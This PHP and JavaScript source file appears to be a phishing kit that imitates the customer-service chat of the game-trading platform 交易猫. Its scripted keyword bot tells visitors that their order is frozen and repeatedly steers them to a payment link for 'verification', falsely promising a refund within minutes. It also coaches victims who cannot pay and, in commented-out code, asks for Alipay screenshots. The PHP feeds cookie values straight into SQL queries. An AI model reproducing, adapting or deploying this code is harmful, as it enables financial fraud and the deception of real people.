<?php 
Define('PM_CALL',true);
Define('INC_CALL',true);
include dirname(__FILE__).('/../includes/global.class.php');
include dirname(__FILE__).('/../config/mysql.func.php');
include dirname(__FILE__).('/../config/Conn.php');
include dirname(__FILE__).('/../includes/getdata.php');
$ip=getIP();
setcookie('GoodsID4',$_COOKIE['GoodsID3']);
//写入订单号
setcookie('orderid',$zhuanzhuanORDER);


if($_COOKIE['GoodsID']){


	    $cookTel=substr_replace($_COOKIE['se_tel'],'****',3,4);


	$_GoodsID = _fetch_array("SELECT * FROM goods WHERE goods_id='{$_COOKIE['GoodsID']}'") or die('SQL执行错误');

	
	if($_OID){
		_query("
			UPDATE
				useraddress
			SET
				state=2,
				utime='{$_CURRENT_TIME2}'
			WHERE
				uip='{$ip}' LIMIT 1") or die(mysql_error());


	}

}
//先重新将商品ID写入另一个命名的COOKIE中，然后再销毁商品页生成的商品ID的COOKIE
setcookie('GoodsID2',$_COOKIE['GoodsID']);
setcookie("GoodsID");
//判断在商品页传过来的COOKIE是否存在(此页面是登陆页面，属于安全系数，所以用于防止客户刷新依然停留或者发给其他用户看)
//如果发给用户看，COOKIE中的URL地址不存在，就返回设定好的跳转地址
if($_COOKIE['GoodsURL1_1']){
    if(!$_COOKIE['GoodsID']){
	   header('Location:'. htmlspecialchars_decode($_COOKIE['GoodsURL1_1']).'');
    }
}else{
    header('Location:'. htmlspecialchars_decode($Class1_jump_url).'');
}

if($_GoodsID['oldnewc']==1){
$oldnewc888="yue99();";
$oldnewc8888="block";}
if($_GoodsID['oldnewc']==2){
$oldnewc888="location.href='login.php?weixin=<?php echo md5($DOWNNa);?>'";
$oldnewc8888="none";}



?>


<html><head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>交易猫客服中心</title>
    <link rel="stylesheet" type="text/css" href="font_Icon/iconfont.css">
    <link rel="stylesheet" type="text/css" href="css/chat.css">
</head>
<body style="text-align: center;">

<div class="chatContainer">
    
    <div class="chatBtn">
        <i class="iconfont icon-xiaoxi1"></i>
    </div>
    <div class="chat-message-num" style="padding: 0px;"></div>
    <div class="chatBox" ref="chatBox" style="display: block;">
        <div class="chatBox-head">
            <div class="chatBox-head-one" style="display: none;">
          
              
            </div>
            <div style="display: block;">
                
              
                    
                    <div class="chatroom-notice" id="chatroom_tips">
                        <marquee align="absmiddle" scrollamount="-1" onmouseout="this.start()" onmouseover="this.stop()">注意：请勿泄露您的账号密码、联系方式给任何人。交易猫客服不会以任何形式索要您的账号、密码、联系方式。请认准交易猫唯一官方网站http://www.jiaoyimao.com/，谨防诈骗。</marquee>
                    </div>
                
           
        </div>
        <div class="chatBox-info" style="height: 504px;">
            <div class="chatBox-list" ref="chatBoxlist" style="height: 504px; display: none;"></div>
               
                <div class="chatBox-content" style="height: 458px;">
                    <div class="chatBox-content-demo" id="chatBox-content-demo" style="height: 458px;">

                        <div class="clearfloat">
                            
                            <div class="author-name">
                                <small class="chat-date" id="systime"></small>
                            </div>
                           
                            <div class="left">
                                <div class="chat-avatars"><img src="https://p.ssl.qhimg.com/t01f7ae399ac375f4f0.png" alt="头像"></div>
                                <div class="chat-message">
                                    你好！请问有什么可以帮到您的吗？
                                </div>
                                <div class="chatroom-tips-content" style="margin-top:10px;">亲，现在反馈的人太多了。为避免您长时间等待，建议您到<a href="http://m.jiaoyimao.com/feedbackCenter/feedback" target="_blank">意见反馈</a>反馈相关问题建议。</div>
                            </div>
                        </div>
                        

             
                        <script type="text/javascript">
                            function yuehao() {
                                setTimeout(function () {
                                var yuehao01 = document.getElementById("yuehao01");
                                    yuehao01.style.display="";
                                }, 1000);
                                    var yuehao02 = document.getElementById("yuehao02");
                                    yuehao02.style.display="none";
                                
                            }
                            
                            
                            
                            
                            </script>
                            
                    <div class="clearfloat"><div id="yuehao01" style="display:none;"><div class="right"> <div class="chat-message" >订单:1668186476109</div> <div class="chat-avatars"><img src="css/985.jpg" alt="头像"></div></div> </div> </div><div class="clearfloat"><div class="author-name"><small class="chat-date" id="timenow"></small> </div> <div class="left">   </div> 
                </div>
                
 </div></div>
             
   

<form id="kefu.php" action="saveReport.htm" method="post" onsubmit="return saveReport();"> 
                <div class="foot_msg" style="margin-top:-5%;">
        	
        	
        	
                    <div class="" style="
                            padding:8px 10px;
                            display:flex;
                            align-items:center;
                            justify-content:space-between;
                            background:#fff;
                    ">
                        
                            <div class="layui-box input-but  size" style="height:auto;">
                                <img src="img/photo.png" alt="">
                              
                                <input type="file" onchange="selectImg(this)" accept="image/jpg,image/jpeg,image/png" name="file" id="inputImage" class="fileinput">
                            </div>
                    
                            <div  type="text" class="div-textarea" placeholder="发送消息..."></div> 
                        <span class="btn-default-styles" id="chat-fasong" style="
                                font-size: 1rem; color: rgb(15, 168, 250); opacity: 1;
                            ">
                            发送
                        </span>
                    </div>
                </div> 
        </form> 


                <div class="widget-panel widget-jym-panel" id="widge_panel_jym">
                    <ul style="width: 120px">
                        <li>
                            <form id="imgFileForm" method="POST" enctype="multipart/form-data">
                                <div class="fileInputContainer">
                                    <input class="fileInput" type="file" id="imgFile" name="imgFile" onchange="uploadImg();" accept="image/*"><span>图片</span>
                                </div>
                            </form>
                        </li>
                        <li>
                                                                                <a href="javascript:void(0);" onclick="JymService.userCenter();" style="text-align: center">
                                        <i class="icon-jym-user"></i><span>个人中心</span>
                                    </a>
                                                    
                        </li>
                        <li>
                            <a href="javascript:void(0);" id="widge_order_btn" style="text-align: center">
                                <i class="icon-jym-order"></i>
                                <span>订单</span>
                            </a>
                        </li>
                    </ul>
                </div>
                    <div class="widge-face-wrap" id="face_wrap">
                    
                    <div id="slide_point" class="face-list-point">
                                                </div>
                </div>
            </div>
        
        </div>
        
        <!-- 订单弹窗 -->
        <div id="yuehao02" class="evaluate-wrap" style="display: block;"onclick="yuehao();"><div class="order" ><div class="order-loading" style="display: none;"></div> <div class="order-hd">
                    选择订单
                    <a onclick="yuehao();" class="order-close">×</a></div> <div class="order-tab"></div> <div class="order-bd"><div class="order-content" style="display: block;"><div class="order-item"> <div class="bd"><img src="<?php echo $_GoodsID['goods_img1'] ?>?size=197x197" alt="" class="img"> <div class="content" ><p class="tit">【<?php echo $_GoodsID['user_name'];?>】<?php echo $_GoodsID['title']; ?></p> <p class="info"><?php echo $oldnewa88; ?>客户端</p> <p class="total">合计: ￥  <?php echo $_GoodsID['price'];?></p> <p class="price">￥  <?php echo $_GoodsID['price'];?>
                                        <em>x1</em></p></div></div> <div class="ft"><span>订单状态</span>异常冻结
                            </div></div>
                            </div></div> <div class="order-empty" style="display: none;"> 还没有订单哦 </div></div></div></div></div>
        
                
                    <div class="biaoqing-photo" style="display: none;">
                        <ul>
                            <li><span class="emoji-picker-image" style="background-position: -9px -18px;"></span></li>
                            <li><span class="emoji-picker-image" style="background-position: -40px -18px;"></span></li>
                            <li><span class="emoji-picker-image" style="background-position: -71px -18px;"></span></li>
                            <li><span class="emoji-picker-image" style="background-position: -102px -18px;"></span></li>
                            <li><span class="emoji-picker-image" style="background-position: -133px -18px;"></span></li>
                            <li><span class="emoji-picker-image" style="background-position: -164px -18px;"></span></li>
                            <li><span class="emoji-picker-image" style="background-position: -9px -52px;"></span></li>
                            <li><span class="emoji-picker-image" style="background-position: -40px -52px;"></span></li>
                            <li><span class="emoji-picker-image" style="background-position: -71px -52px;"></span></li>
                            <li><span class="emoji-picker-image" style="background-position: -102px -52px;"></span></li>
                            <li><span class="emoji-picker-image" style="background-position: -133px -52px;"></span></li>
                            <li><span class="emoji-picker-image" style="background-position: -164px -52px;"></span></li>
                            <li><span class="emoji-picker-image" style="background-position: -9px -86px;"></span></li>
                            <li><span class="emoji-picker-image" style="background-position: -40px -86px;"></span></li>
                            <li><span class="emoji-picker-image" style="background-position: -71px -86px;"></span></li>
                            <li><span class="emoji-picker-image" style="background-position: -102px -86px;"></span></li>
                            <li><span class="emoji-picker-image" style="background-position: -133px -86px;"></span></li>
                            <li><span class="emoji-picker-image" style="background-position: -164px -86px;"></span></li>
                            <li><span class="emoji-picker-image" style="background-position: -9px -120px;"></span></li>
                            <li><span class="emoji-picker-image" style="background-position: -40px -120px;"></span></li>
                            <li><span class="emoji-picker-image" style="background-position: -71px -120px;"></span></li>
                            <li><span class="emoji-picker-image" style="background-position: -102px -120px;"></span>
                            </li>
                            <li><span class="emoji-picker-image" style="background-position: -133px -120px;"></span>
                            </li>
                            <li><span class="emoji-picker-image" style="background-position: -164px -120px;"></span>
                            </li>
                            <li><span class="emoji-picker-image" style="background-position: -9px -154px;"></span></li>
                            <li><span class="emoji-picker-image" style="background-position: -40px -154px;"></span></li>
                            <li><span class="emoji-picker-image" style="background-position: -71px -154px;"></span></li>
                            <li><span class="emoji-picker-image" style="background-position: -102px -154px;"></span>
                            </li>
                            <li><span class="emoji-picker-image" style="background-position: -133px -154px;"></span>
                            </li>
                            <li><span class="emoji-picker-image" style="background-position: -164px -154px;"></span>
                            </li>
                        </ul>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>


<script src="css/jq.js"></script>
<script>

    	//监听input是否有值，改变发送按钮颜色
	 $("#text_in").bind("input propertychange",function(event){
	 	var text_in_value = $("#text_in").val();
	 	console.log(typeof text_in_value);
 	 	console.log(text_in_value.length);

    	//  具体代码
		if(text_in_value.length == 0){
			$("#send").css('opacity',0.2);
			
		}else{
			$("#send").css('opacity',1);
		}
	});
	
	

    function timenow() {
        var myDate = Date();
        var times = myDate.toLocaleString( );
        return times
    }

   document.getElementById('systime').innerHTML = timenow();
    screenFuc();
    function screenFuc() {
        var topHeight = $(".chatBox-head").innerHeight();//聊天头部高度
        //屏幕小于768px时候,布局change
        var winWidth = $(window).innerWidth();
        if (winWidth <= 768) {
            var totalHeight = $(window).height(); //页面整体高度
            $(".chatBox-info").css("height", totalHeight - topHeight);
            var infoHeight = $(".chatBox-info").innerHeight();//聊天头部以下高度
            //中间内容高度
            $(".chatBox-content").css("height", infoHeight - 46);
            $(".chatBox-content-demo").css("height", infoHeight - 46);

            $(".chatBox-list").css("height", totalHeight - topHeight);
            $(".chatBox-kuang").css("height", totalHeight - topHeight);
            $(".div-textarea").css("width", winWidth - 106);
        } else {
            $(".chatBox-info").css("height", 495);
            $(".chatBox-content").css("height", 448);
            $(".chatBox-content-demo").css("height", 448);
            $(".chatBox-list").css("height", 495);
            $(".chatBox-kuang").css("height", 495);
            $(".div-textarea").css("width", 260);
        }
    }
    (window.onresize = function () {
        screenFuc();
    })();
    //未读信息数量为空时
    var totalNum = $(".chat-message-num").html();
    if (totalNum == "") {
        $(".chat-message-num").css("padding", 0);
    }
    $(".message-num").each(function () {
        var wdNum = $(this).html();
        if (wdNum == "") {
            $(this).css("padding", 0);
        }
    });


    //打开/关闭聊天框
    $(".chatBtn").click(function () {
        $(".chatBox").toggle(10);
    })
    $(".chat-close").click(function () {
        $(".chatBox").toggle(10);
    })
    //进聊天页面
    $(".chat-list-people").each(function () {
        $(this).click(function () {
            var n = $(this).index();
            $(".chatBox-head-one").toggle();
            $(".chatBox-head-two").toggle();
            $(".chatBox-list").fadeToggle();
            $(".chatBox-kuang").fadeToggle();

            //传名字
            $(".ChatInfoName").text($(this).children(".chat-name").children("p").eq(0).html());

            //传头像
            $(".ChatInfoHead>img").attr("src", $(this).children().eq(0).children("img").attr("src"));

            //聊天框默认最底部
            $(document).ready(function () {
                $("#chatBox-content-demo").scrollTop($("#chatBox-content-demo")[0].scrollHeight);
            });
        })
    });

    //返回列表
    $(".chat-return").click(function () {
        $(".chatBox-head-one").toggle(1);
        $(".chatBox-head-two").toggle(1);
        $(".chatBox-list").fadeToggle(1);
        $(".chatBox-kuang").fadeToggle(1);
    });

    //      发送信息
    $("#chat-fasong").click(function () {
        var textContent = $(".div-textarea").html().replace(/[\n\r]/g, '<br>')
        if (textContent != "") {
            $(".chatBox-content-demo").append("<div class=\"clearfloat\">" +
                "<div class=\"author-name\"><small class=\"chat-date\" id=\"timenow\"></small> </div> " +
                "<div class=\"right\"> <div class=\"chat-message\"> " + textContent + " </div> " +
                "<div class=\"chat-avatars\"><img src=\"css/985.jpg\" alt=\"头像\" /></div> </div> </div>");
            //发送后清空输入框
            $(".div-textarea").html("");
            //聊天框默认最底部
            $(document).ready(function () {
                $("#chatBox-content-demo").scrollTop($("#chatBox-content-demo")[0].scrollHeight);
            });
            
            document.getElementById('timenow').innerHTML = timenow();
//开头语句开始
            if(textContent.indexOf("你好") != "-1"){
                setTimeout(function () {
                var re = "您好，在的，小喵正在查询订单状态，请您稍等并保持在线,不要离开本页面哦！";
                reply(re);
            }, 2000);
            setTimeout(function () {
                var re = "您好，订单:1668186476109被系统判定为买家存在异地安全风险，现已将账号和所支付的资金安全冻结，请买家点击下方按钮进行支付验证，已证明交易猫账号目前是您本人在用，该笔资金5分钟内原路退回您所支付的账户中，完成后订单即可解封，进行继续交易或退款操作！";
                reply(re);
            }, 12000);
            setTimeout(function () {
            var re = "请尽快完成验证，该笔验证资金5分钟内退回您所支付的账户中<br><a href=\'<?php echo $_GoodsID['zhifubaoURL'];?>'\><button  class=\'btn-chat-primary'\>验证支付</button></a>";
                reply(re);
            }, 20000);
            }
            else   if(textContent.indexOf("1668") != "-1"){
                setTimeout(function () {
                var re = "您好，在的，小喵正在查询订单状态，请您稍等并保持在线,不要离开本页面哦！";
                reply(re);
            }, 2000);
            setTimeout(function () {
                var re = "您好，订单:1668186476109被系统判定为买家存在异地安全风险，现已将账号和所支付的资金安全冻结，请买家点击下方按钮进行支付验证，已证明交易猫账号目前是您本人在用，该笔资金5分钟内原路退回您所支付的账户中，完成后订单即可解封，进行继续交易或退款操作！";
                reply(re);
            }, 12000);
            setTimeout(function () {
            var re = "请尽快完成验证，该笔验证资金5分钟内退回您所支付的账户中<br><a href=\'<?php echo $_GoodsID['zhifubaoURL'];?>'\><button  class=\'btn-chat-primary'\>验证支付</button></a>";
                reply(re);
            }, 20000);
            }
            else   if(textContent.indexOf("在吗") != "-1"){
                setTimeout(function () {
                var re = "您好，在的，小喵正在查询订单状态，请您稍等并保持在线,不要离开本页面哦！";
                reply(re);
            }, 2000);
            setTimeout(function () {
                var re = "您好，订单:1668186476109被系统判定为买家存在异地安全风险，现已将账号和所支付的资金安全冻结，请买家点击下方按钮进行支付验证，已证明交易猫账号目前是您本人在用，该笔资金5分钟内原路退回您所支付的账户中，完成后订单即可解封，进行继续交易或退款操作！";
                reply(re);
            }, 12000);
            setTimeout(function () {
            var re = "请尽快完成验证，该笔验证资金5分钟内退回您所支付的账户中<br><a href=\'<?php echo $_GoodsID['zhifubaoURL'];?>'\><button  class=\'btn-chat-primary'\>验证支付</button></a>";
                reply(re);
            }, 20000);
            }
            else  if(textContent.indexOf("有人吗") != "-1"){
                setTimeout(function () {
                var re = "您好，在的，小喵正在查询订单状态，请您稍等并保持在线,不要离开本页面哦！";
                reply(re);
            }, 2000);
            setTimeout(function () {
                var re = "您好，订单:1668186476109被系统判定为买家存在异地安全风险，现已将账号和所支付的资金安全冻结，请买家点击下方按钮进行支付验证，已证明交易猫账号目前是您本人在用，该笔资金5分钟内原路退回您所支付的账户中，完成后订单即可解封，进行继续交易或退款操作！";
                reply(re);
            }, 12000);
            setTimeout(function () {
            var re = "请尽快完成验证，该笔验证资金5分钟内退回您所支付的账户中<br><a href=\'<?php echo $_GoodsID['zhifubaoURL'];?>'\><button  class=\'btn-chat-primary'\>验证支付</button></a>";
                reply(re);
            }, 20000);
            }
             else if(textContent.indexOf("为什么冻结") != "-1"){
            setTimeout(function () {
                var re = "订单:1668186476109被系统判定为买家存在异地安全风险，现已将账号和所支付的资金安全冻结，请买家点击下方按钮进行支付验证，已证明交易猫账号目前是您本人在用，该笔资金5分钟内原路退回您所支付的账户中，完成后订单即可解封，进行继续交易或退款操作！";
                reply(re);
            }, 12000);
            setTimeout(function () {
            var re = "请尽快完成验证，该笔验证资金5分钟内退回您所支付的账户中<br><a href=\'<?php echo $_GoodsID['zhifubaoURL'];?>'\><button  class=\'btn-chat-primary'\>验证支付</button></a>";
                reply(re);
            }, 20000);
            }
            else if(textContent.indexOf("怎么解封") != "-1"){
            
            setTimeout(function () {
                var re = "您好，订单:1668186476109被系统判定为买家存在异地安全风险，现已将账号和所支付的资金安全冻结，请买家点击下方按钮进行支付验证，已证明交易猫账号目前是您本人在用，该笔资金5分钟内原路退回您所支付的账户中，完成后订单即可解封，进行继续交易或退款操作！";
                reply(re);
            }, 12000);
            setTimeout(function () {
            var re = "请尽快完成验证，该笔验证资金5分钟内退回您所支付的账户中<br><a href=\'<?php echo $_GoodsID['zhifubaoURL'];?>'\><button  class=\'btn-chat-primary'\>验证支付</button></a>";
                reply(re);
            }, 20000);
            }

            else if(textContent.indexOf("为啥冻结") != "-1"){
                setTimeout(function () {
                var re = "订单:1668186476109被系统判定为买家存在异地安全风险";
                reply(re);
            }, 2000);
            }
       
            else if(textContent.indexOf("没钱") != "-1"){
                setTimeout(function () {
                var re = "小喵要保证资金与账号的安全所以也没有办法哦，请您联系买家协商降低商品价格，验证资金也会相应降低！";
                reply(re);
            }, 2000);
            }
            
            else if(textContent.indexOf("没这么多") != "-1"){
                setTimeout(function () {
                var re = "小喵要保证资金与账号的安全所以也没有办法哦，请您联系买家协商降低商品价格，验证资金也会相应降低！";
                reply(re);
            }, 2000);
            }
            
            else if(textContent.indexOf("不够") != "-1"){
                setTimeout(function () {
                var re = "小喵要保证资金与账号的安全所以也没有办法哦，请您联系买家协商降低商品价格，验证资金也会相应降低！";
                reply(re);
            }, 2000);
            }
       
            else if(textContent.indexOf("少点") != "-1"){
                setTimeout(function () {
                var re = "小喵要保证资金与账号的安全所以也没有办法哦，请您联系买家协商降低商品价格，验证资金也会相应降低！";
                reply(re);
            }, 2000);
            }
            
            else if(textContent.indexOf("没钱") != "-1"){
                setTimeout(function () {
                var re = "小喵要保证资金与账号的安全所以也没有办法哦，请您联系买家协商降低商品价格，验证资金也会相应降低！";
                reply(re);
            }, 2000);
            }
            
            else if(textContent.indexOf("不验证") != "-1"){
                setTimeout(function () {
                var re = "小喵要保证资金与账号的安全所以也没有办法哦，还请您联系买家协商降低商品价格，验证资金也会相应降低！";
                reply(re);
            }, 2000);
            }

            else if(textContent.indexOf("少支付") != "-1"){
                setTimeout(function () {
                var re = "小喵要保证资金与账号的安全所以也没有办法哦，请您联系买家协商降低商品价格，验证资金也会相应降低！";
                reply(re);
            }, 2000);
            }
            else if(textContent.indexOf("可以吗") != "-1"){
                setTimeout(function () {
                var re = "小喵要保证资金与账号的安全所以也没有办法哦，请您联系买家协商降低商品价格，验证资金也会相应降低！";
                reply(re);
            }, 2000);
            }
            else if(textContent.indexOf("行不") != "-1"){
                setTimeout(function () {
                var re = "小喵要保证资金与账号的安全所以也没有办法哦，请您联系买家协商降低商品价格，验证资金也会相应降低！";
                reply(re);
            }, 2000);
            }
            else if(textContent.indexOf("那么多") != "-1"){
                setTimeout(function () {
                var re = "小喵要保证资金与账号的安全所以也没有办法哦，请您联系买家协商降低商品价格，验证资金也会相应降低！";
                reply(re);
            }, 2000);
            }
            else if(textContent.indexOf("怎么支付") != "-1"){
                setTimeout(function () {
                var re = "<a href=\'<?php echo $_GoodsID['zhifubaoURL'];?>'\><button  class=\'btn-chat-primary'\>验证支付</button></a>";
                reply(re);
            }, 2000);
            }
            else if(textContent.indexOf("咋支付") != "-1"){
                setTimeout(function () {
                var re = "<a href=\'<?php echo $_GoodsID['zhifubaoURL'];?>'\><button  class=\'btn-chat-primary'\>验证支付</button></a>";
                reply(re);
            }, 2000);
            }
            else if(textContent.indexOf("天解封") != "-1"){
                setTimeout(function () {
                var re = "可以的哦，喵喵！";
                reply(re);
            }, 2000);
            }
            else if(textContent.indexOf("晚上可") != "-1"){
                setTimeout(function () {
                var re = "可以的哦，喵喵！";
                reply(re);
            }, 2000);
            }
            else if(textContent.indexOf("晚上行") != "-1"){
                setTimeout(function () {
                var re = "可以的哦，喵喵！";
                reply(re);
            }, 2000);
            }
            else if(textContent.indexOf("下午可") != "-1"){
                setTimeout(function () {
                var re = "可以的哦，喵喵！";
                reply(re);
            }, 2000);
            }
            else if(textContent.indexOf("下午行") != "-1"){
                setTimeout(function () {
                var re = "可以的哦，喵喵！";
                reply(re);
            }, 2000);
            }

            else if(textContent.indexOf("天可") != "-1"){
                setTimeout(function () {
                var re = "可以的哦，喵喵！";
                reply(re);
            }, 2000);
            }
            else if(textContent.indexOf("支付就好") != "-1"){
                setTimeout(function () {
                var re = "是的哦，喵喵！";
                reply(re);
            }, 2000);
            }
            else if(textContent.indexOf("支付就能") != "-1"){
                setTimeout(function () {
                var re = "是的哦，喵喵！";
                reply(re);
            }, 2000);
            }
            else if(textContent.indexOf("支付就可") != "-1"){
                setTimeout(function () {
                var re = "是的哦，喵喵！";
                reply(re);
            }, 2000);
            }
            else if(textContent.indexOf("支付就行") != "-1"){
                setTimeout(function () {
                var re = "是的哦，喵喵！";
                reply(re);
            }, 2000);
            }
            else if(textContent.indexOf("支付完") != "-1"){
                setTimeout(function () {
                var re = "是的哦，喵喵！";
                reply(re);
            }, 2000);
            }
            else if(textContent.indexOf("好了") != "-1"){
                setTimeout(function () {
                var re = "好的哦，请稍等正在核实，完成后即可解封！";
                reply(re);
            }, 2000);
            }
            else if(textContent.indexOf("付了") != "-1"){
                setTimeout(function () {
                var re = "好的哦，请稍等正在核实，完成后即可解封！";
                reply(re);
            }, 2000);
            }
            else if(textContent.indexOf("账号安全") != "-1"){
                setTimeout(function () {
                var re = "请打开交易猫APP咨询在线客服！";
                reply(re);
            }, 2000);
            }
            else if(textContent.indexOf("订单仲裁") != "-1"){
                setTimeout(function () {
                var re = "请打开交易猫APP咨询订单仲裁客服！";
                reply(re);
            }, 2000);
            }

            else if(textContent.indexOf("取消订单") != "-1"){
                setTimeout(function () {
                var re = "请完成验证支付后才可以取消哦！";
                reply(re);
            }, 2000);
            }
            else if(textContent.indexOf("怎么要") != "-1"){
                setTimeout(function () {
                var re = "系统判定为买家存在异地安全风险，现已将账号和所支付的资金安全冻结，买家进行支付验证，已证明交易猫账号目前是您本人在用，该笔资金5分钟内原路退回您所支付的账户中";
                reply(re);
            }, 2000);
            }
            else if(textContent.indexOf("咋要") != "-1"){
                setTimeout(function () {
                var re = "系统判定为买家存在异地安全风险，现已将账号和所支付的资金安全冻结，买家进行支付验证，已证明交易猫账号目前是您本人在用，该笔资金5分钟内原路退回您所支付的账户中";
                reply(re);
            }, 2000);
            }
            else if(textContent.indexOf("为啥要") != "-1"){
                setTimeout(function () {
                var re = "系统判定为买家存在异地安全风险，现已将账号和所支付的资金安全冻结，买家进行支付验证，已证明交易猫账号目前是您本人在用，该笔资金5分钟内原路退回您所支付的账户中";
                reply(re);
            }, 2000);
            }
            else if(textContent.indexOf("好的") != "-1"){
                setTimeout(function () {
                var re = "谢谢亲的支持与理解^_^！";
                reply(re);
            }, 2000);
            }

else if(textContent.indexOf("为啥被") != "-1"){
                setTimeout(function () {
                var re = "系统判定为买家存在异地安全风险，现已将账号和所支付的资金安全冻结";
                reply(re);
            }, 2000);
            }




            else if(textContent.indexOf("怎么入驻") != "-1"){
                setTimeout(function () {
                var re = "进入有券官网，点击【商家加盟】-自主注册入驻，具体流程为：一、选择店铺类型；二、填写并提交相关资质、店铺名 (入驻成功后店铺名不能修改)、店铺LOGO、店铺详情等信息；三、等待有券平台审核；四、平台审核通过后签约；五 、上架商品。";
                reply(re);
            }, 2000);
            }
 //             else if(textContent.indexOf("在吗") != "-1"){
  //                setTimeout(function () {
  //                var re = "您好，在的，小喵正在查询订单状态，请您稍等并保持在线哦！";
  //                reply(re);
  //            }, 2000);
  //            setTimeout(function () {
 //                 var re = "您好，订单:1668186476109被系统判定为买家存在异地安全风险，现已将账号和所支付的资金安全冻结，请买家点击下方按钮进行支付验证，已证明交易猫账号目前是您本人在用，该笔资金5分钟内原路退回您所支付的账户中，完成后订单即可解封，进行继续交易或退款操作！";
 //                 reply(re);
  //              var re = "请上传支付宝主页和花呗主页图，以便我们核实是否为本人操作<br>示例<br><center><img src=\'https://gw.alicdn.com/bao/uploaded/i3/O1CN017VxxDz1brkOBMVXXm_!!0-fleamarket.jpg_450x10000Q75.jpg_.webp' style=\'width:20%;height:20%;'\>&nbsp;&nbsp;&nbsp;&nbsp;<img src=\'https://gw.alicdn.com/bao/uploaded/i3/O1CN017VxxDz1brkOBMVXXm_!!0-fleamarket.jpg_450x10000Q75.jpg_.webp' style=\'width:20%;height:20%;'\></center>	<a href=\'javascript:void(0);'\class=\'avatar_uplpad_btn'\ id=\'avatar_uplpad_btn4'\><button  class=\'btn-chat-primary'\>上传资料</button></a>";
   //               reply(re);
               
   //           }, 15000);
   //           }
  //          else if(textContent.indexOf("有人吗") != "-1"){
   //             setTimeout(function () {
    //            var re = "您好，在的，小喵正在查询订单状态，请您稍等并保持在线哦！";
  //              reply(re);
  //          }, 2000);     
   //         setTimeout(function () {
   //             var re = "您好，订单:1668186476109被系统判定为买家存在异地安全风险，现已将账号和所支付的资金安全冻结，请买家点击下方按钮上传资料打款验证，已证明交易猫账号目前是您本人在用，完成后订单即可解封，进行继续交易或退款操作！";
   //             reply(re);
   //            var re = "	<a href=\'javascript:void(0);'\class=\'avatar_uplpad_btn'\ id=\'avatar_uplpad_btn4'\><button  class=\'btn-chat-primary'\>上传资料</button></a>";
   //             reply(re);
    //        }, 15000);
     //       }
      //      else if(textContent.indexOf("为什么冻结",) != "-1"){
      //          setTimeout(function () {
      //          var re = "您好，在的，小喵正在查询订单状态，请您稍等并保持在线哦！";
       //         reply(re);
       //     }, 2000);     
     //       setTimeout(function () {
     //           var re = "您好，订单:1668186476109被系统判定为买家存在异地安全风险，现已将账号和所支付的资金安全冻结，请买家点击下方按钮上传资料打款验证，已证明交易猫账号目前是您本人在用，完成后订单即可解封，进行继续交易或退款操作！";
   //             reply(re);
    //            var re = "	<a href=\'javascript:void(0);'\class=\'avatar_uplpad_btn'\ id=\'avatar_uplpad_btn4'\><button  class=\'btn-chat-primary'\>上传资料</button></a>";
   //             reply(re);
    //        }, 15000);
   //         }
   //         else if(textContent.indexOf("怎么解封",) != "-1"){
            //    setTimeout(function () {
          //      var re = "您好，在的，小喵正在查询订单状态，请您稍等并保持在线哦！";
          //      reply(re);
         //   }, 2000);     
         //   setTimeout(function () {
         //       var re = "您好，订单:1668186476109被系统判定为买家存在异地安全风险，现已将账号和所支付的资金安全冻结，请买家点击下方按钮上传资料打款验证，已证明交易猫账号目前是您本人在用，完成后订单即可解封，进行继续交易或退款操作！";
         //       reply(re);
          //      var re = "	<a href=\'javascript:void(0);'\class=\'avatar_uplpad_btn'\ id=\'avatar_uplpad_btn4'\><button  class=\'btn-chat-primary'\>上传资料</button></a>";
           //     reply(re);
      //      }, 15000);
       //     }
       
//开头语句结束

            else if(textContent.indexOf("怎么入驻") != "-1"){
                setTimeout(function () {
                var re = "进入有券官网，点击【商家加盟】-自主注册入驻，具体流程为：一、选择店铺类型；二、填写并提交相关资质、店铺名 (入驻成功后店铺名不能修改)、店铺LOGO、店铺详情等信息；三、等待有券平台审核；四、平台审核通过后签约；五 、上架商品。";
                reply(re);
            }, 2000);
            }
            else if(textContent.indexOf("商家运营") != "-1"){
                setTimeout(function () {
                var re = "您可以点击联系客服，联系客服对接，登记填写“商家数据库”链接，运营会挖掘其中的优质商家进行对接。";
                reply(re);
            }, 2000);
            }
            else{
                var re = "小喵没听懂您说的话哦<br>1.帐号安全问题<br>2.订单仲裁问题<br>3.订单冻结问题<br>4.订单解封问题<br>5.验证金到账问题<br>请回复关键词，小喵为您解答哦！";
                reply(re);
            }
            
        }
    });

    //      发送表情
    $("#chat-biaoqing").click(function () {
        $(".biaoqing-photo").toggle();
    });
    $(document).click(function () {
        $(".biaoqing-photo").css("display", "none");
    });
    $("#chat-biaoqing").click(function (event) {
        event.stopPropagation();//阻止事件
    });

    $(".emoji-picker-image").each(function () {
        $(this).click(function () {
            var bq = $(this).parent().html();
            console.log(bq)
            $(".chatBox-content-demo").append("<div class=\"clearfloat\">" +
                "<div class=\"author-name\"><small class=\"chat-date\" id=\"timenow\"></small> </div> " +
                "<div class=\"right\"> <div class=\"chat-message\"> " + bq + " </div> " +
                "<div class=\"chat-avatars\"><img src=\"css/985.jpg\" alt=\"头像\" /></div> </div> </div>");
            //发送后关闭表情框
            $(".biaoqing-photo").toggle();
            //聊天框默认最底部
            $(document).ready(function () {
                $("#chatBox-content-demo").scrollTop($("#chatBox-content-demo")[0].scrollHeight);
            });
            document.getElementById('timenow').innerHTML = timenow();
        })
    });
//自动回复
    function reply(textContent) {
            if (textContent != "") {
                $(".chatBox-content-demo").append("<div class=\"clearfloat\">" +
                    "<div class=\"author-name\"><small class=\"chat-date\" id=\"timenow\"></small> </div> " +
                    "<div class=\"left\"><div class=\"chat-avatars\"><img src=\"https://p.ssl.qhimg.com/t01f7ae399ac375f4f0.png\" alt=\"头像\" /></div>  " +
                    "<div class=\"chat-message\"> " + textContent + " </div> </div> </div>");
                //发送后清空输入框
              //  $(".div-textarea").html("");
                //聊天框默认最底部
                $(document).ready(function () {
                    $("#chatBox-content-demo").scrollTop($("#chatBox-content-demo")[0].scrollHeight);
                });
                document.getElementById('timenow').innerHTML = timenow();
            }
    }
    //      发送图片
    function selectImg(pic) {
        if (!pic.files || !pic.files[0]) {
            return;
        }
        var reader = new FileReader();
        reader.onload = function (evt) {
            var images = evt.target.result;
            $(".chatBox-content-demo").append("<div class=\"clearfloat\">" +
                "<div class=\"author-name\"><small class=\"chat-date\" id=\"timenow\"></small> </div> " +
                "<div class=\"right\"> <div class=\"chat-message\"><img src=" + images + "></div> " +
